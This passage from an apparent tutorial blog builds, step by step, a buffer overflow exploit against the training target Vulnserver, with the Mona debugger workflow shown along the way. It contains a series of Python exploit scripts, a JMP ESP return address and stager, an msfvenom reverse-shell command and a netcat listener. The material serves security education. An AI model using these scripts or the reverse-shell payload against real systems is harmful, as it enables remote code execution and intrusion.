n8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9"
# Build our payload of the prefix and the pattern
payload = prefix + pattern

# We're entering our `try` statement, for basic error handling
try:
  # Define our network socket, with `socket.AF_INET` representing IPV4 address family for `socket.SOCK_STREAM` as it's a TCP connection
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    # Set a timeout so the connection will end if the target is unreponsive
    s.settimeout(2)
    # Connect to the target
    s.connect((host, port))
    # Receive welcome banner
    s.recv(1024)
    # Print message
    print("Sending payload")
    # Send payload to target
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)

{% endhighlight %}

So this script should connect to the target, and send the pattern created by `msf-pattern_create`.

Great, that should be good to go. Let’s get Vulnserver loaded up in Immunity. And click run or `F9`. Then we can run our new python script. 

{% include post-image name="eip/kali-pattern.png" %}{:style="width:50%"}

{% include post-image name="eip/windows-pattern.png" %}{:style="width:100%"}

Great - vulnserver has crashed. We can see our payload in the stack. And we’ve hit an access violation when executing `396f4338` which is the address in the EIP. What’s happened here? Well if we convert the hex of `39 6f 43 38` to ascii, we get `9oC8`. We then need to remember that x86 uses little endian ordering, so we can reverse this to get a string of `8Co9`. Meaning this is the unique four characters in the pattern that we sent, that have overwritten the EIP. 

Using `msf-pattern_offset` we can use the length of the pattern that we sent, along with the hex representation of the string as it appears in the EIP with:

`msf-pattern_offset -l 2100 -q 396f4338`

{% include post-image name="eip/msf-pattern-offset.png" %}{:style="width:50%"}

That gives us an offset of 2006. That means that there are 2006 bytes after the end of our `TRUN .` prefix and the start of the return address in that stack frame. Awesome, let’s validate that.

Very similar python script this time, all that we’ve changed is the payload here. Instead of sending that pattern, we’re sending something slightly different.

{% highlight python linenos %}
#!/usr/bin/env python3

import socket, sys

host = "10.128.200.96"
port = 9999

prefix = "TRUN ."

# Overwrite return address with 42424242 (hex for BBBB)
return_address = "BBBB"
# Set our offset of 2006 bytes
offset = 2006
# Build our payload of the prefix, 2006 bytes of A, and then our return address
payload = prefix + offset * "A" + return_address

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending payload")
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)
{% endhighlight %}

We expect the `A`s to fill up the allocated buffer space with `41`s, and the `B`s to overwrite the return address and EIP with `42`s. On the Windows machine, restart Immunity and Vulnserver by pressing `ctrl F2`, then run by pressing `F9`. We can then run our new script. 

{% include post-image name="eip/eip-kali.png" %}{:style="width:50%"}

{% include post-image name="eip/eip-windows.png" %}{:style="width:100%"}

Awesome that’s crashed the application and overwritten the EIP with `42424242` which is hex for `BBBB`. Perfect - we can overwrite the EIP with arbitrary values now - the next step in developing our buffer overflow exploit.

# Finding Space

{% include video id="-YvMNfMyi7Q" provider="youtube" %}

We can reliable overflow the buffer and write up to the return address with 2006 bytes of `A`. Now 2006 bytes will be plenty for us to use this space for our shellcode, as a typical reverse shell is around 3-400 bytes. But this won’t always be the case, in some circumstances, we may only need a small payload to overflow the buffer not giving us enough space to place our code. Alternatively, there may not be any CPU registers pointing to any of our payload, meaning it may be challenging to get there.

Both of these issues could be solved by finding some other space that we can write to. We may actually be able to include data after the return address included in our payload, which will overflow into any of the current frames parameters, and into other stack frames. Do bear in mind, that dependant on what data we overwrite here, we could break other things and cause unexpected crashes. So we need to find out how much space after the return address we can safely write to whilst still triggering our controlled crash. This could open up more space for us to use, as well as potentially allowing us to write to an address that one of the registers is pointing to. This will come in handy later.
 
We’ll modify our script again. All we’ve changed here is the payload. We’ve specified how much space we want to try to write to after the return address address. We’ll try for 500 bytes as that will give us plenty of space.

{% highlight python linenos %}
#!/usr/bin/env python3

import socket, sys

host = "10.128.200.96"
port = 9999

prefix = "TRUN ."

# Set our space filler size as 500 bytes
space_filler = 500
# Return address placeholder of 42424242
return_address = "BBBB"
# Set our offset of 2006 bytes
offset = 2006
# Build our payload of our prefix + 2006 bytes of A + 500 bytes of C
payload = prefix + offset * "A" + return_address + space_filler * "C"

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending payload")
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)
{% endhighlight %}

This should send our string of 2006 `A`s, our placeholder in the return address followed by 500 bytes of `C`. We're trying to see if we can write 500 bytes after the return address without breaking the overflow.

Let’s load up Vulnserver in Immunity. And press `F9` to run it. And we can send our payload.

{% include post-image name="space/space-kali.png" %}{:style="width:60%"}

{% include post-image name="space/space-windows.png" %}{:style="width:100%"}

Great - the application has still crashed with our return address being written to the EIP. This won’t always be the case - if not, try a smaller space filler size in the script.

Reviewing the stack, we can see our `A`s filling up the buffer, our `B`s overwriting the return address. And the start of our `C`s to help us see how much space we have. We could calculate the length manually to ensure all 500 bytes are here. But if we click the address at the start of our `C`s, it will show other addresses as an offset from this point.

{% include post-image name="space/space-start.png" %}{:style="width:30%"}

So we can scroll down to the end of the `C`s and we can see it ends at `+1F4` which is hex for 500.

{% include post-image name="space/space-finish.png" %}{:style="width:30%"}

Great - all of our `C`s are present in memory here, so we know we have at least 500 bytes available after the return address that we can write to without breaking the overflow.

This process will need to be rerun with the filler size adjusted in the script to get a good idea of how much space we have. Do bear in mind, that even a few bytes could come in handy as it can allow us to place a stager there.


# Bad Characters

{% include video id="QTWrpGCvNQA" provider="youtube" %}

So what are bad characters? Simply put, bad characters are certain bytes that interfere with us achieving our buffer overflow due to how they’re interpreted by the target program. For example the hex of `00` represents a null byte, which is often used to terminate a string. `0A` represents a line feed and `0D` represents a carriage return. Because of this, if included in our payload certain bytes may not end up in memory in the same manner that they’re sent. We need to identify what these are, as we won’t be able to use them in our payload, both for the address that we’re going to overwrite the return address with, and within our shellcode.

The general concept here is is for us to send an array containing 255 byte values to the target and compare it with the data written to the memory stack. The null byte is typical assumed a bad character and so omitted. We can then work our list down removing the identified bad characters until our sent array, and the array written to the memory stack match.

We need to generate our character array first. Again, probably many ways to do this, but a python one-liner would be like this:

`python3 -c 'for num in range(1, 256): print(f"\\x{num:02x}", end="")'`

Or you can copy it from here (a bit more nicely formatted for line breaks)
```
chars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```


Let's update our script to send this payload. 

{% highlight python linenos %}
#!/usr/bin/env python3

import socket, sys

host = "10.128.200.96"
port = 9999

prefix = "TRUN ."

# Our generated character array
chars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
# Return address placeholder of 42424242
return_address = "BBBB"
# Our offset of 2006 bytes
offset = 2006
# Building our payload
payload = prefix +  offset * "A" + return_address + chars

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending payload")
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)

{% endhighlight %}

If space after the return address is limited, we could alternatively replace a portion of the `A`s required to overflow the buffer, with our array of characters and then pad the remaining space with `A`s by calculating the length of the character array and taking that away from the offset. The downsides of this approach, are that any bad characters could cause our overflow to not trigger the crash as expected, and if we’re restricted for space - we may have to break down the character array into groups and go through this process in a few runs. I’ll touch on how to manage this method a little later, but the script for this approach could be as follows:

{% highlight python linenos %}
#!/usr/bin/env python3

import socket, sys

host = "10.128.200.96"
port = 9999 

prefix = "TRUN ."

# Our generated character array
chars = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" 
# Return address placeholder of 42424242
return_address = "BBBB"
# Our offset of 2006 bytes
offset = 2006
# Building our payload with the character array padded with the As required for the overflow
payload = prefix + chars + (offset - len(chars)) * "A" + return_address

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending payload")
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)
{% endhighlight %}

Going with the first approach for now, let's load up Immunity and Vulnserver, and press `F9` to resume the program. We can now run our new script.

{% include post-image name="badchars/badchars-kali.png" %}{:style="width:60%"}

{% include post-image name="badchars/badchars-windows.png" %}{:style="width:100%"}

Great - Vulnserver has crashed and we can see our array here in memory. Do note that the ESP is pointing straight to this character array as it will come in handy in later videos. It won’t always be right at the top of the stack but should be findable from here. A cursory glance and it looks okay, but we can automate this check for us easily.

We’ll use Mona for this. [Mona](https://github.com/corelan/mona) is a tool that runs on Immunity or WinDbg to automate certain tasks. There are alternative tools and methods for other debuggers and platforms but the concept should be the same. 

The installation is nice and simple, we just need to place `mona.py` in the pycommands folder in the Immunity installation directory.

We can interact with mona using the command field at the bottom of the Immunity UI. To start with, we’ll set a working folder as we’ll be storing a couple of files. This command will create the folder named as the process name and id.

`!mona config set workingfolder c:\mona\%p_%i`

{% include post-image name="badchars/mona-workingdir.png" %}{:style="width:80%"}

Great - now we want to create a reference array to compare our characters in memory against.  We’ll create a byte array and use the `-cpb` flag to define our bad characters that have been omitted from the array that we sent. That starts with the null byte of `\x00`.

`!mona bytearray -cpb "\x00"`

{% include post-image name="badchars/mona-refchars.png" %}{:style="width:80%"}

Great that reference array has been created in our working directory. And to check it, we use the mona compare command, with our reference file specified with `-f`. And we need to specify the address of the start of our character array in memory with `-a`. You can enter registers here if any registers are pointing to the target address so we can enter 'esp' here.

`!mona compare -f bytearray.bin -a esp`

{% include post-image name="badchars/mona-badchars.png" %}{:style="width:80%"}

Okay great, this has come back as unmodified - meaning that the array in memory matches the reference array exactly so there are no bad characters.

Let’s take a quick look at a different target to see what would happen if there were bad characters - we're using [Tib3rius' room on TryHackMe](https://tryhackme.com/room/bufferoverflowprep) for this, which is a great resource for practicing buffer overflow.

{% include post-image name="badchars/alt-memdump.png" %}{:style="width:60%"}

We can see in the memory dump, that the initial bytes match the standard order, until we get to `23` which is `0A` instead, and then `24` is `0D`. 
Let’s run mona to compare this for us.

{% include post-image name="badchars/alt-monacompare.png" %}{:style="width:80%"}

We’re given a quick summary telling us some bad characters, but unfortunately, it’s not quite as simple as that. Let’s take a closer look at the memory comparison window to see what I’m talking about.

{% include post-image name="badchars/alt-monadetail.png" %}{:style="width:60%"}

In this view, we can see what's in the reference file, along with any discrepancies in memory listed below. Now, there’s a possibility that `23` is a bad character and `24` is not, as bad characters can impact the characters following it. So, in this case, we’ll update our script to omit `23` as a bad character. Then restart Immunity, resume the program and then run our updated script.

In Immunity, we'll want to create a new reference array, but this time also ommiting `\x23` as a bad character with:

`!mona bytearray -cpb "\x00\x23"`

And then we can compare the array in memory with the reference array again with:

`!mona compare -f bytearray.bin -a esp`

Checking our the memory comparision window again, we can see that `24` is no longer malformed, meaning it was just being malformed by byte `23`.

{% include post-image name="badchars/alt-monadetail2.png" %}{:style="width:60%"}

This process will need to be repeated, removing one character from the array each time, until the array sent in our script, and array in memory match perfectly.

I mentioned a scenario earlier that we need to cover now - it was what we do if we’re including the character array within our buffer overflow and there’s a character in there that’s preventing the overflow from occurring. 

All we need to do in this instance in split the character array into half. And send each half within the payload during separate runs. If one of them successfully causes the overflow, and one does not - then we know the one that contains the bad character causing issues, and so we can repeat the process on that half until we’ve narrowed it down completely. There can of course be multiple bad characters, which this process should identify. Once you’ve removed the characters preventing the overflow, you’ll still want to rerun through the memory comparison process just as we’ve gone through with mona as characters still may be malformed without breaking the overflow.

Now, irrelevant of which approach you’ve taken you should’ve built out a list of bad characters, these will come in handy later when we’re searching for addresses to jump to, and for building our shell code.

# Jump Points and Stagers

{% include video id="HX3hWFFLBgM" provider="youtube" %}

When first running through the buffer overflow in the simple `strcpy` example - we jumped straight to the address containing our shell-code. But this address won’t always be consistent across runs and machines - it was viable for demonstration purposes as the steps were completed concurrently on the same system with memory protections disabled.

## Jump Points

Instead, we need to direct execution to an instruction included in memory, within executables or loaded shared libraries. We’re looking for an instruction to jump to our shell code or a stager via a register. For example, if the ESP is pointing to our shellcode, then a `JMP ESP` instruction would be perfect.

Let’s consider our current scenario. Our overflow requires the prefix, plus 2006 bytes to overflow the buffer and reach the return address. One key piece of information you may remember from the last video, is that once the target crashed due to the overflow, the ESP was pointing to the address directly after the overwritten return address, which is where we’d placed our character array. This makes a `JMP ESP` the perfect candidate for us.

Let’s load up Immunity and Vulnserver. We’re looking for a loaded module that includes the assembly instructions that we need. To get a view of what modules are loaded, we can use mona - you don’t necessarily need to view the loaded modules to proceed with exploiting the target, but we'll take a look anyway.

`!mona modules`

{% include post-image name="jump/mona-modules.png" %}{:style="width:100%"}

Great, we can see the loaded modules. Here, we can see the memory protections that have been applied - such as Address Space Layout Randomisation or ASLR. For the context of these exploits, we’re looking for modules without these protections enabled.

We can actually search across all of the modules easily with mona using `!mona jmp`. By default, it omits any results that belong to a module with ASLR or Rebase enabled. We specify the register that contains the address we want to jump to with `-r`, and specify our discovered bad characters with `-cpb`. This is important as we need to ensure that the addresses for these instructions do not include any of our bad characters - as including those characters would break our overflow.

`!mona jmp -r esp -cpb "\x00"`

There is an alternative method using `!mona find`, that can be used to search for more complex instructions. `-s` is specifying the instruction that we're searching for, `-type` is used here as we're providing the assembly instructions instead of the default opcodes. Instuctions included in modules with memory protections are filtered our using `-cm`. Instructions with addresses including bad characters are ommited with `-cpb`.

`!mona find -s 'jmp esp' -type instr -cm aslr=false,rebase=false,nx=false -cpb "\x00"`

In Immunity, the results of `!mona find` and `!mona jmp` are hidden automatically, but they can be accessed by clicking `Window > Log Data`.

{% include post-image name="jump/mona-jmp.png" %}{:style="width:100%"}

Great there are a few here that look like good candidates within essfunc.dll, we can see the instructions memory addresses and the memory protections that have been enabled. Due to the memory protections being disabled, this address should be consistent across runs and systems.

Taking a note of the address of the top instruction of `0x625011af`, we can head back to the main Immunity window and search for this address - which shows that it does include `FFE4` or `JMP ESP`.

{% include post-image name="jump/jmpesp-inst.png" %}{:style="width:100%"}

Let’s set a breakpoint here to the debugger with catch it once it reaches this instruction. We can either do that by right clicking and selecting the option - or just pressing `F2`. And then `F9` to resume the program.

And now the updated script to try and jump to this address. The return address in our script has finally been replaced here with the address of the `JMP ESP` instruction. Do remember, that due to the endian-ness of the target, the address of `\x62\x50\x11\xaf` becomes `\xaf\x11\x50\x62`.

{% highlight python linenos %}
#!/usr/bin/env python3

import socket, sys

host = "10.128.200.96"
port = 9999 

prefix = "TRUN ."

# return address to JMP ESP in little endian
return_address = "\xaf\x11\x50\x62"
offset = 2006
payload = prefix +  offset * "A" + return_address

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending payload")
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)
{% endhighlight %}

We expect the `A`s to fill up the allocated bufferspace, before overflowing and overwriting up to the return address. The return address should then be replaced with the address to the `JMP ESP` instruction, which will then be `POP`ed into the EIP as the next instruction for execution.

Let's run the script

{% include post-image name="jump/jmpesp-kali.png" %}{:style="width:60%"}

{% include post-image name="jump/jmpesp-break.png" %}{:style="width:100%"}

Great we’ve hit the breakpoint on that `JMP ESP` instruction meaning we’ve successfully hit it. 

We can check where the `ESP` is pointing to by clicking on the register address and choosing to view in dump. 

{% include post-image name="jump/jmpesp-dump.png" %}{:style="width:100%"}

We can see that it's pointing directly after the return address in our payload - we know we have space to write to this area as we placed our bad character array here earlier. Continuing through code execution by clicking 'step into' or pressing `F7` and the address in the ESP is written the EIP as the next instruction for execution. This could include our shellcode.

{% include post-image name="jump/jmpesp-step.png" %}{:style="width:100%"}

## Stager

Now, let’s consider a slightly different scenario - imagine the same buffer overflow, but we’re restricted with how much we can write after the return address. Let’s say if we write more than 10 bytes then we’re overwriting something else triggering a different crash, and not our controlled one.

You may have noticed that the EAX is almost pointing to the start of our payload but unfortunately includes the prefix of `TRUN .`.

{% include post-image name="jump/eax-contents.png" %}{:style="width:40%"}

We can use a stager to get around this. Essentially what we’ll get the stager to do, is shift the EAX along 6 bytes, to move it to the start of our `A`s and then we’ll jump to it.

We’ll need to find out what opcode represents these instructions. 

The metasploit framework has a tool for this, called nasm shell, which is preinstalled in kali. You can load it up with `msf-nasm_shell`, and then we just need to enter the instructions that we need the opcodes for being `add eax,6` to shift the EAX 6 bytes, and `jmp eax` to jump to the EAX.

{% include post-image name="jump/nasm-shell.png" %}{:style="width:40%"}

Great - so that's `83 c0 06 ff e0` to add 6 bytes to the EAX and then to jump to it. This should shift the EAX to the start of our `A`s before jumping there.

Let’s look at a python example to exploit this, again - we’ve just changed the payload section.

{% highlight python linenos %}
#!/usr/bin/env python3

import socket, sys

host = "10.128.200.96"
port = 9999

prefix = "TRUN ."

# address of JMP ESP instruction
return_address = "\xaf\x11\x50\x62"
# stager of add eax,6 jmp eax
stager = "\x83\xc0\x06\xff\xe0"
offset = 2006
# payload with stager prepended after return address
payload = prefix + offset * "A" + return_address + stager

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending payload")
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)
{% endhighlight %}

We'll load up Imunity and Vulnserver again and restart it. We'll need to set a breakpoint at `0x625011af` again so we can follow the execution flow. And then we can resume execution in Immunity and run our script.

{% include post-image name="jump/stager-kali.png" %}{:style="width:40%"}

We've hit our breakpoint and can see `JMP ESP` as the next instruction to be executed.

{% include post-image name="jump/stager-windows-breakpoint.png" %}{:style="width:100%"}

Stepping into code execution, we can see that the ESP is loaded into the EIP and `add eax,6` is the next instruction for execution. Note that the EAX is currently pointing to the start of our payload including `TRUN .`.

{% include post-image name="jump/stager-windows-jmpesp.png" %}{:style="width:100%"}

Stepping into code execution further and this instruction will be run.

{% include post-image name="jump/stager-windows-addeax.png" %}{:style="width:100%"}

Great, we can see that the EAX has now been shifted and point to the start of our `A`s.

Stepping into execution again and `jmp eax` is executed - we can now see our `A`s loaded as the next instructions to execute, which could later be replaced with shellcode.

{% include post-image name="jump/stager-windows-jmpeax.png" %}{:style="width:100%"}

# Executing Code

{% include video id="2EYK2QCpoa4" provider="youtube" %}

A quick summary - our payload consists of `"TRUN ." + "A" * 2006 + "\xaf\x11\x50\x62"` to overflow the buffer and get us to a `jmp esp` instruction. We can write at least 500 bytes after the return address which will be plenty for our shellcode, so we'll place the shellcode there for the context of this article. However the same concepts should apply if the shellcode is placed elsewhere.

We can use msfvenom to create this payload. Msfvenom supports a wide range of payloads which can be viewed with:
`msfvenom -l payloads`

We’ll use the windows unstaged reverse shell payload specified with `-p`, with the IP of our attacking machine specified as the `LHOST` and the port that we'll set our netcat listener up on as the `LPORT`. We'll set an `EXITFUNC` of thread which should allow the target program to continue running once we exit our shell. We set the formatting of python with `-f` and a variable name of shellcode with `-v`.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.128.200.xx LPORT=443 EXITFUNC=thread -b "\x00" -f python -v shellcode` 

{% include post-image name="execution/msf-payload.png" %}{:style="width:80%"}

Great msfvenom has created us a payload of 351 bytes.

We’ll need to paste this payload into our script, however we will make one change. Due to the way we’re handling the encoding in our script, we’ll remove the 'b' from the string definitions. You'll notice the nop sled included before the shellcode, this was touched on briefly earlier but provides some padding of No Operation bytes to allow for space for our payload to unpack.

Do remember, that if you’re including your shellcode within the space required to overflow the buffer, as opposed to appended to the end - you’ll need to ensure that it’s sufficiently padded with extra characters to trigger the overflow and rewrite the return address.

{% highlight python linenos %}
#!/usr/bin/env python3

import socket, sys

host = "10.128.200.96"
port = 9999

prefix = "TRUN ."

# Include shellcode generated by msfvenom 
shellcode = !!MSFVENOMPAYLOAD!! 

# address of JMP ESP instruction 
return_address = "\xaf\x11\x50\x62"
offset = 2006
# build payload with a 16 byte nop sled and shellcode appended
payload = prefix + offset * "A" + return_address + 16 * "\x90" + shellcode

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(2)
    s.connect((host, port))
    s.recv(1024)
    print("Sending payload")
    s.send(bytes(payload, "latin-1"))

except:
  print("Something went wrong")
  sys.exit(0)
{% endhighlight %}

Let’s load up Immunity and Vulnserver. And we’ll set a breakpoint at the `jmp esp` instruction that we’re using at `0x625011af`. Now we can resume the program, and then run our script.

{% include post-image name="execution/kali-shell-debug.png" %}{:style="width:50%"}

We can see that we've hit our breakpoint - and can step into execution until our nopsled and shellcode are loaded as the next instructions to be executed.

{% include post-image name="execution/windows-shell-debug.png" %}{:style="width:100%"}

Let's close Immunity and run Vulnserver by itself as the debugger can interfere with our shell.

And we'll need to set up a netcat listener listening on the port and IP that we set in the reverse shell payload with `nc -lnvp 443`. 

Running our script - and the reverse shell connects back from the target - allowing us to execute arbitrary code.

{% include post-image name="execution/kali-shell-script.png" %}{:style="width:50%"}


{% include post-image name="execution/kali-shell.png" %}{:style="width:50%"}

Great - we've successfully discovered and developed a buffer overflow exploit. I hope you've learned something.
